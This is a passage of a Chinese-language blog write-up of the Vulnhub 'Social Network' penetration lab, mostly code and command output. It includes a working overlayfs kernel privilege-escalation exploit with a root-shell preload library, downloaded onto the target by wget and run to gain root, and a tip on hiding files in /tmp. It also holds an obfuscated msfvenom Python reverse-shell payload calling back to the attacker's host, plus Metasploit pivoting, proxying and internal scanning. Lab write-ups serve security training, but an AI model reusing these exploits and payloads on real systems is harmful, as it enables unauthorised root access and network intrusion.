+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LIB <span class="hljs-meta-string">&quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><br>lib = open(<span class="hljs-string">&quot;/tmp/ofs-lib.c&quot;</span>,O_CREAT|O_WRONLY,<span class="hljs-number">0777</span>);<br>    write(lib,LIB,<span class="hljs-built_in">strlen</span>(LIB));<br>    close(lib);<br>    lib = system(<span class="hljs-string">&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;</span>);<br>    <span class="hljs-keyword">if</span>(lib != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;couldn&#x27;t create dynamic library\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>把 LIB 和编译部分的代码复制出来，写入文件 generate.c ，编译运行，生成 ofs-lib.so ，与 ofs 文件一同上传到靶机，赋权限执行即可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sched.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/stat.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/mount.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdio.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;unistd.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sched.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/stat.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/mount.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;sys/types.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;signal.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;fcntl.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;string.h&gt;</span><br><span class="hljs-meta">#</span><span class="bash">include &lt;linux/sched.h&gt;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">define LIB <span class="hljs-string">&quot;#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \&quot;getuid\&quot;);\nreadlink(\&quot;/proc/self/exe\&quot;, (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \&quot;/bin/su\&quot;)) &#123;\nunlink(\&quot;/etc/ld.so.preload\&quot;);unlink(\&quot;/tmp/ofs-lib.so\&quot;);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\&quot;/bin/sh\&quot;, \&quot;sh\&quot;, \&quot;-i\&quot;, NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n&quot;</span></span><br><br>int main()<br>&#123;<br>    int lib;<br>    lib = open(&quot;/tmp/ofs-lib.c&quot;,O_CREAT|O_WRONLY,0777);<br>    write(lib,LIB,strlen(LIB));<br>    close(lib);<br>    lib = system(&quot;gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w&quot;);<br>    if(lib != 0) &#123;<br>        fprintf(stderr,&quot;couldn&#x27;t create dynamic library\n&quot;);<br>        exit(-1);<br>    &#125;<br>    return 0;<br></code></pre></td></tr></table></figure>
+<p>本地编译修改好的漏洞脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc 37292.c -o ofs</span>                                                                                                                   <br><span class="hljs-meta">$</span><span class="bash"> gcc generate.c -o ge</span>                                                                                       <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./ge</span>                                              <br>                                                                                                             $ mv /tmp/ofs-lib.so ./                                                      <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.151 - - [02/Jul/2022 00:45:07] &quot;GET /ofs HTTP/1.1&quot; 200 -<br>192.168.135.151 - - [02/Jul/2022 00:45:54] &quot;GET /ofs-lib.so HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure>
+<p>靶机通过 wget 下载编译好的脚本及 ofs-lib.so 文件，运行即可拿到 root 权限。</p>
+<blockquote>
+<p>ofs-lib.so 文件需要放在 tmp 目录下，因为提权文件里写的路径是 /tmp，而且 tmp 是存放临时文件的，会消除我们上传的文件，有利于隐藏攻击 。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell">john@socnet:~$ wget http://192.168.135.141:8888/ofs<br><br>john@socnet:~$ wget http://192.168.135.141:8888/ofs-lib.so<br><br>john@socnet:~$ ./ofs<br>-bash: ./ofs: Permission denied<br>john@socnet:~$ chmod +x ofs<br>john@socnet:~$ ./ofs<br>spawning threads<br>mount #1<br>mount #2<br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br>ERROR: ld.so: object &#x27;/tmp/ofs-lib.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object &#x27;/tmp/ofs-lib.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object &#x27;/tmp/ofs-lib.so&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>Password: <br>su: Authentication failure<br>john@socnet:~$ ls<br>ofs  ofs-lib.so<br>john@socnet:~$ mv ofs-lib.so /tmp<br>john@socnet:~$ ls<br>ofs<br>john@socnet:~$ ls /tmp<br>ofs-lib.so<br>john@socnet:~$ ./ofs<br>spawning threads<br>mount #1<br>mount #2<br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root),1001(john)<br></code></pre></td></tr></table></figure>
+<p>可以使用 SSH 拷贝文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> scp ./exp john@192.168.135.151:/tmp</span> <br><span class="hljs-meta">$</span><span class="bash"> scp /tmp/ofs-lib.so john@192.168.135.151:/tmp</span><br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ol>
+<li>web 端口扫描、目录扫描</li>
+<li>python 代码执行：反弹 shell</li>
+<li>docker：内网渗透</li>
+<li>内网渗透：主机发现、内网穿透、内网扫描、Elasticsearch漏洞</li>
+<li>Hash 爆破：Hashcat</li>
+<li>内核提权</li>
+</ol>
+<h2 id="五、MSF"><a href="#五、MSF" class="headerlink" title="五、MSF"></a>五、MSF</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/204066#h2-5">Vulnhub | Social Network 渗透靶机 - 安全客，安全资讯平台 (anquanke.com)</a></p>
+</blockquote>
+<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>使用 <code>msfvenom</code> 生成 python 木马，反弹 shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.135.141 LPORT=4444</span><br>[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload<br>[-] No arch selected, selecting arch: python from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 501 bytes<br>exec(__import__(&#x27;base64&#x27;).b64decode(__import__(&#x27;codecs&#x27;).getencoder(&#x27;utf-8&#x27;)(&#x27;aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMTM1LjE0MScsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==&#x27;)[0]))<br></code></pre></td></tr></table></figure>
+<p>启动MSF，设置 Payload 监听，再把生成的木马放到 web 提交，成功反弹 shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfconsole</span><br><br>msf6 &gt; use exploit/multi/handler<br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br><br>Payload options (generic/shell_reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST                   yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br><br><br>msf6 exploit(multi/handler) &gt; set LHOST 192.168.135.141<br>LHOST =&gt; 192.168.135.141<br>msf6 exploit(multi/handler) &gt; set payload python/meterpreter/reverse_tcp<br>payload =&gt; python/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; show options<br><br>Module options (exploit/multi/handler):<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br><br>Payload options (python/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target<br><br><br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br><br>[*] Sending stage (39560 bytes) to 192.168.135.151<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.151:53585) at 2022-07-01 10:38:01 -0400<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+<p>发现是个 docker ，难道要 docker 逃逸？回头看了看靶机作者的提示，有一个 pivoting 跳板攻击，应该是以这台机器当跳板 。</p>
+<h3 id="自动路由"><a href="#自动路由" class="headerlink" title="自动路由"></a>自动路由</h3><p>接下来就是设置自动路由，扫描一下这个 docker 的局域网环境，先看看 docker1 的网络信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; ifconfig<br><br>Interface  1<br>============<br>Name         : lo<br>Hardware MAC : 00:00:00:00:00:00<br>MTU          : 65536<br>Flags        : UP LOOPBACK RUNNING<br>IPv4 Address : 127.0.0.1<br>IPv4 Netmask : 255.0.0.0<br><br>Interface  6<br>============<br>Name         : eth0<br>Hardware MAC : 02:42:ac:11:00:03<br>MTU          : 1500<br>Flags        : UP BROADCAST RUNNING MULTICAST<br>IPv4 Address : 172.17.0.2<br>IPv4 Netmask : 255.255.0.0<br></code></pre></td></tr></table></figure>
+<p>然后使用 msf 的 autoroute 模块自动路由：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; run autoroute -s 172.17.0.0/16	# 添加路由<br><br>[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.<br>[!] Example: run post/multi/manage/autoroute OPTION=value [...]<br>[*] Adding a route to 172.17.0.0/255.255.0.0...<br>[+] Added route to 172.17.0.0/255.255.0.0 via 192.168.135.151<br>[*] Use the -p option to list all active routes<br>meterpreter &gt; run autoroute -p		# 查看路由<br><br>[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.<br>[!] Example: run post/multi/manage/autoroute OPTION=value [...]<br><br>Active Routing Table<br>====================<br><br>   Subnet             Netmask            Gateway<br>   ------             -------            -------<br>   172.17.0.0         255.255.0.0        Session 1<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+<p>对内网进行端口扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; run auxiliary/scanner/portscan/tcp rhosts=172.17.0.0/24<br><br>[+] 172.17.0.1:           - 172.17.0.1:22 - TCP OPEN<br>[+] 172.17.0.1:           - 172.17.0.1:5000 - TCP OPEN<br>[+] 172.17.0.2:           - 172.17.0.2:5000 - TCP OPEN<br>[+] 172.17.0.3:           - 172.17.0.3:9200 - TCP OPEN<br>[+] 172.17.0.3:           - 172.17.0.3:9300 - TCP OPEN<br>[*] 172.17.0.0/24:        - Scanned  26 of 256 hosts (10% complete)<br>[*] 172.17.0.0/24:        - Scanned  52 of 256 hosts (20% complete)<br>[*] 172.17.0.0/24:        - Scanned  77 of 256 hosts (30% complete)<br>[*] 172.17.0.0/24:        - Scanned 103 of 256 hosts (40% complete)<br>[*] 172.17.0.0/24:        - Scanned 128 of 256 hosts (50% complete)<br>[*] 172.17.0.0/24:        - Scanned 154 of 256 hosts (60% complete)<br>[*] 172.17.0.0/24:        - Scanned 180 of 256 hosts (70% complete)<br>[*] 172.17.0.0/24:        - Scanned 205 of 256 hosts (80% complete)<br>[*] 172.17.0.0/24:        - Scanned 231 of 256 hosts (90% complete)<br>[*] 172.17.0.0/24:        - Scanned 256 of 256 hosts (100% complete)<br></code></pre></td></tr></table></figure>
+<p>为了方便后续渗透，建立 socks 代理。</p>
+<h3 id="msf-的代理模块-proxychains4"><a href="#msf-的代理模块-proxychains4" class="headerlink" title="msf 的代理模块 + proxychains4"></a>msf 的代理模块 + proxychains4</h3><p>让会话在后台运行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">meterpreter &gt; background		# 让 meterpreter 会话在后台运行<br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; sessions -l		# 查看会话命令<br><br>Active sessions<br>===============<br><br>  Id  Name  Type                      Information          Connection<br>  --  ----  ----                      -----------          ----------<br>  1         meterpreter python/linux  root @ dbca22cf339d  192.168.135.141:4444 -&gt; 192.168.135.151:55647 (192.168.135.151)<br><br>msf6 exploit(multi/handler) &gt; sessions 1	# 进入会话<br>[*] Starting interaction with 1...<br><br>meterpreter &gt; background<br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; <br></code></pre></td></tr></table></figure>
+<p>配置 socks 服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxy<br>msf6 auxiliary(server/socks_proxy) &gt; show options<br><br>Module options (auxiliary/server/socks_proxy):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   PASSWORD                   no        Proxy password for SOCKS5 listener<br>   SRVHOST   0.0.0.0          yes       The address to listen on<br>   SRVPORT   1080             yes       The port to listen on<br>   USERNAME                   no        Proxy username for SOCKS5 listener<br>   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)<br><br><br>Auxiliary action:<br><br>   Name   Description<br>   ----   -----------<br>   Proxy  Run a SOCKS proxy server<br><br><br>msf6 auxiliary(server/socks_proxy) &gt; run<br>[*] Auxiliary module running as background job 0.<br>msf6 auxiliary(server/socks_proxy) &gt; <br>[*] Starting the SOCKS proxy server<br><br></code></pre></td></tr></table></figure>
+<p>配置 proxychains4 配置文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo vim /etc/proxychains4.conf</span><br><span class="hljs-meta">#</span><span class="bash"> socks5 127.0.0.1 1080</span><br></code></pre></td></tr></table></figure>
+<p>接下来就可以使用 proxychains4 代理各种工具进入 docker 1 的 172.17 网段 。</p>
+<h3 id="内网扫描-1"><a href="#内网扫描-1" class="headerlink" title="内网扫描"></a>内网扫描</h3><blockquote>
+<p>至于如何扫描 172 网段的信息，可以将 nmap 上传到靶机，就在本地扫描，这样快稳很多，记得要添加 nmap 执行权限。</p>
+</blockquote>
+<p>在配置好代理之后，可以使用 kali 的代理工具 proxychains4 进行内网渗透 ：</p>
+<blockquote>
+<p>proxychains 不代理 UDP，ICMP，SYN 网络协议，无法进行系统探测，主机发现等等，但是可以用 <code>-sT</code> 参数并结合 <code>-Pn</code> 进行 TCP端口扫描  。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> proxychains4 nmap -Pn -sT -sV -p9200,9300 172.17.0.3</span><br>Nmap scan report for 172.17.0.3 (172.17.0.3)<br>Host is up (0.057s latency).<br><br>PORT     STATE SERVICE  VERSION<br>9200/tcp open  wap-wsp?<br>9300/tcp open  vrace?<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port9200-TCP:V=7.91%I=7%D=7/3%Time=62C170E3%P=x86_64-pc-linux-gnu%r(RTS<br>SF:PRequest,4F,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20<br>SF:charset=UTF-8\r\nContent-Length:\x200\r\n\r\n&quot;)%r(SIPOptions,4F,&quot;HTTP/1<br>SF:\.1\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20charset=UTF-8\r\nCo<br>SF:ntent-Length:\x200\r\n\r\n&quot;);<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 122.26 seconds<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains curl http://172.17.0.3:9200</span>             <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9200  ...  OK<br>&#123;<br>  &quot;status&quot; : 200,<br>  &quot;name&quot; : &quot;Baphomet&quot;,<br>  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,<br>  &quot;version&quot; : &#123;<br>    &quot;number&quot; : &quot;1.4.2&quot;,<br>    &quot;build_hash&quot; : &quot;927caff6f05403e936c20bf4529f144f0c89fd8c&quot;,<br>    &quot;build_timestamp&quot; : &quot;2014-12-16T14:11:12Z&quot;,<br>    &quot;build_snapshot&quot; : false,<br>    &quot;lucene_version&quot; : &quot;4.10.2&quot;<br>  &#125;,<br>  &quot;tagline&quot; : &quot;You Know, for Search&quot;<br>&#125;<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> proxychains curl http://172.17.0.3:9300</span><br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.14<br>[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.3:9300  ...  OK<br>curl: (52) Empty reply from server<br></code></pre></td></tr></table></figure>
+<p>开放 9200 和 9300 端口，通过搜索发现 9200 是 ElasticSearch 服务，是一个基于 Lucene 的搜索服务器，使用 Java 语言开发的 。</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/02/Penetration/Vulnhub/Part-1/0x10%20Empire-LupinOne/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Empire：LupinOne</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/30/Penetration/Vulnhub/W1R3S%E4%BA%A4%E6%B5%81/">
+                        <span class="hidden-mobile">W1R3S交流</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
